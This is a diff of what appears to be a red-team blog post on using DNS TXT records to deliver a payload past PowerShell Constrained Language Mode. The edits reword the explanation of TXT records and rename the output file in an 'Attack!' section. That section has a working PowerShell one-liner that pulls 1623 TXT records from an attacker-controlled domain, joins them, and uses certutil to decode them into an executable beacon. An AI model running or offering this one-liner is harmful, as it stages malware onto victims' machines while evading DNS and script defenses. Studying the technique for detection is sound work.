@@ -9,7 +9,7 @@ DNS tunneling is a technique that has been around for a long time and used by a 
 
 Because this is such a old and well known technique, many organizations have detection methods in place to try and prevent it. 
 
-The DNS record type of choice for DNS tunneling is TXT records.  This is because TXT records can hold a lot more data than other records, and as I discovered during this research, they are also case-sensitive, something that the other records are not which can have an impact when we start talking about encoding.
+The DNS record type of choice for DNS tunneling has historically been TXT.  This is because TXT records can hold more data than other records and they are also case-sensitive, something that the other records are not which can have an impact when we start talking about encoding.
 
 ## What is Constrained Language Mode?
 
@@ -150,7 +150,7 @@ There is our TXT record!
 
 ## Attack!
 
-We now need to run nslookup... 1623 times.  Less than ideal, but it's what we will do for now.  We will use this powershell one liner in order to run nslookup for each subdomain and then select only the TXT record ($temp[5]) and then build $results as we go.  $results is then written to ./temp.txt, and finally certutil is used to decode temp.txt to final.exe.
+We now need to run nslookup... 1623 times.  Less than ideal, but it's what we will do for now.  We will use this powershell one liner in order to run nslookup for each subdomain and then select only the TXT record ($temp[5]) and then build $results as we go.  $results is then written to ./temp.txt, and finally certutil is used to decode temp.txt to custombeacon.exe.
 
 ```powershell
 $results="";for($num = 1; $num -le 1623 ; $num++){$temp = nslookup -type=TXT "$num.dns.edu....com" 2> $null;$temp = $temp[5].replace("`t","").replace("`"","");$results = $results + $temp};$results > ./temp.txt;certutil -decode ./temp.txt ./custombeacon.exe
